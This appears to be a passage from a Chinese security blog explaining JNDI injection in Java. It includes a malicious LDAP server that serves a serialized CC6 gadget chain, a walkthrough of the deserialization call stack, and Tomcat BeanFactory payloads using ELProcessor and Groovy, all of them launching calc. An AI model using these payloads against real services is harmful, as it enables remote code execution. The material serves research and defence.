+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPSerializeServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] tmp_args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1/#Exp&quot;</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(<span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line">            ds.startListening();  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);  </span><br><span class="line">            <span class="comment">//getObject获取Gadget  </span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAIazI0MzYxNjVzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1lcHQACWdldE1ldGhvZHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AHHNxAH4AE3VxAH4AGAAAAAJwcHQABmludm9rZXVxAH4AHAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdAAEY2FsY3QABGV4ZWN1cQB+ABwAAAABcQB+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQABWhlbGxveA==&quot;</span>));  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>高版本 CC1 打不通，这里用的 CC6</p>
+<h2 id="LDAP-反序列化原理分析"><a href="#LDAP-反序列化原理分析" class="headerlink" title="LDAP+反序列化原理分析"></a>LDAP+反序列化原理分析</h2><p>还是在 <code>exec</code> 打断点，看看调用栈</p>
+<blockquote>
+<p>exec: 347, Runtime (java. lang)<br>invoke0:-1, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 62, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 43, DelegatingMethodAccessorImpl (sun. reflect)<br>invoke: 497, Method (java. lang. reflect)<br>transform: 126, InvokerTransformer (org. apache. commons. collections. functors)<br>transform: 123, ChainedTransformer (org. apache. commons. collections. functors)<br>get: 158, LazyMap (org. apache. commons. collections. map)<br>getValue: 74, TiedMapEntry (org. apache. commons. collections. keyvalue)<br>hashCode: 121, TiedMapEntry (org. apache. commons. collections. keyvalue)<br>hash: 338, HashMap (java. util)<br>readObject: 1397, HashMap (java. util)<br>invoke0:-1, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 62, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 43, DelegatingMethodAccessorImpl (sun. reflect)<br>invoke: 497, Method (java. lang. reflect)<br>invokeReadObject: 1058, ObjectStreamClass (java. io)<br>readSerialData: 1900, ObjectInputStream (java. io)<br>readOrdinaryObject: 1801, ObjectInputStream (java. io)<br>readObject 0:1351, ObjectInputStream (java. io)<br>readObject: 371, ObjectInputStream (java. io)<br>deserializeObject: 531, Obj (com. sun. jndi. ldap)<br>decodeObject: 239, Obj (com. sun. jndi. ldap)<br>c_lookup: 1051, LdapCtx (com. sun. jndi. ldap)<br>p_lookup: 542, ComponentContext (com. sun. jndi. toolkit. ctx)<br>lookup: 177, PartialCompositeContext (com. sun. jndi. toolkit. ctx)<br>lookup: 205, GenericURLContext (com. sun. jndi. toolkit. url)<br>lookup: 94, ldapURLContext (com. sun. jndi. url. ldap)<br>lookup: 417, InitialContext (javax. naming)<br>main: 7, Client</p>
+</blockquote>
+<p>1. <code>InitialContext.lookup </code> ~ <code>GenericURLContext.lookup</code></p>
+<p>和前面基本差不多</p>
+<p>2. <code>PartialCompositeContext.lookup</code> ~ <code>LdapCtx.c_lookup</code></p>
+<p>多出来的几个 <code>lookup </code>， 主要是对 <code>Context</code> 等信息进行处理</p>
+<p>3. <code>Obj.decodeObject</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">decodeObject</span><span class="params">(Attributes var0)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="number">4</span>]));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        Attribute var1;  </span><br><span class="line">        <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">1</span>])) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">var3</span> <span class="operator">=</span> helper.getURLClassLoader(var2);  </span><br><span class="line">            <span class="keyword">return</span> deserializeObject((<span class="type">byte</span>[])((<span class="type">byte</span>[])var1.get()), var3);  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">7</span>])) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="number">2</span>]).get(), (String)var1.get(), var2);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">0</span>]);  </span><br><span class="line">            <span class="keyword">return</span> var1 == <span class="literal">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="number">2</span>]) ? <span class="literal">null</span> : decodeReference(var0, var2);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var5) &#123;  </span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();  </span><br><span class="line">        var4.setRootCause(var5);  </span><br><span class="line">        <span class="keyword">throw</span> var4;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>对应之前的拆包环节，通过 <code>var0</code> 获得 <code>var1</code> 也就是序列化数据，然后传入 <code>deserializeObject</code></p>
+<p>4. <code>Obj.deserializeObject</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializeObject</span><span class="params">(<span class="type">byte</span>[] var0, ClassLoader var1)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var0);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">var20</span> <span class="operator">=</span> var1 == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(var2) : <span class="keyword">new</span> <span class="title class_">LoaderInputStream</span>(var2, var1);  </span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">var21</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">            Object var5;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var5 = ((ObjectInputStream)var20).readObject();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var16) &#123;  </span><br><span class="line">                var21 = var16;  </span><br><span class="line">                <span class="keyword">throw</span> var16;  </span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">                <span class="keyword">if</span> (var20 != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">if</span> (var21 != <span class="literal">null</span>) &#123;  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            ((ObjectInputStream)var20).close();  </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var15) &#123;  </span><br><span class="line">                            var21.addSuppressed(var15);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        ((ObjectInputStream)var20).close();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> var5;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;  </span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();  </span><br><span class="line">            var4.setRootCause(var18);  </span><br><span class="line">            <span class="keyword">throw</span> var4;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var19) &#123;  </span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();  </span><br><span class="line">        var3.setRootCause(var19);  </span><br><span class="line">        <span class="keyword">throw</span> var3;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里 <code>var0</code> 是上一步传下来的序列化数据，放入 <code>var2</code> 后又转入 <code>var20</code>，然后对 <code>var20</code> 进行 <code>readObject</code>，序列化数据在这里触发反序列化，后面就是反序列化的内容了</p>
+<h2 id="BeanFactory-本地类"><a href="#BeanFactory-本地类" class="headerlink" title="BeanFactory+本地类"></a>BeanFactory+本地类</h2><p>主要通过 Tomcat 的 <code>org.apache.naming.factory.BeanFactory</code> 作为 Reference Factory 来实例化本地类并进行利用</p>
+<p>服务端代码</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> ReferenceExp.expELProcessor();</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;tomcatBeanFactory&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReferenceExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expClass</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="BeanFactory-ELProcessor"><a href="#BeanFactory-ELProcessor" class="headerlink" title="BeanFactory+ELProcessor"></a>BeanFactory+ELProcessor</h3><p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Reference</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expELProcessor</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kk=eval&quot;</span>));  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kk&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));  </span><br><span class="line">    <span class="keyword">return</span> ref;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="BeanFactory-GroovyClassLoader-GroovyShell"><a href="#BeanFactory-GroovyClassLoader-GroovyShell" class="headerlink" title="BeanFactory+GroovyClassLoader&#x2F;GroovyShell"></a>BeanFactory+GroovyClassLoader&#x2F;GroovyShell</h3><p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Reference</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expGroovyClassLoader</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kk=parseClass&quot;</span>));  </span><br><span class="line">    <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\nclass Person&#123;&#125;\n&quot;</span>, <span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kk&quot;</span>, script));  </span><br><span class="line">    <span class="keyword">return</span> ref;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expGroovyShell</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyShell&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kk=evaluate&quot;</span>));  </span><br><span class="line">    <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#x27;%s&#x27;.execute()&quot;</span>, <span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kk&quot;</span>, script));  </span><br><span class="line">    <span class="keyword">return</span> ref;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
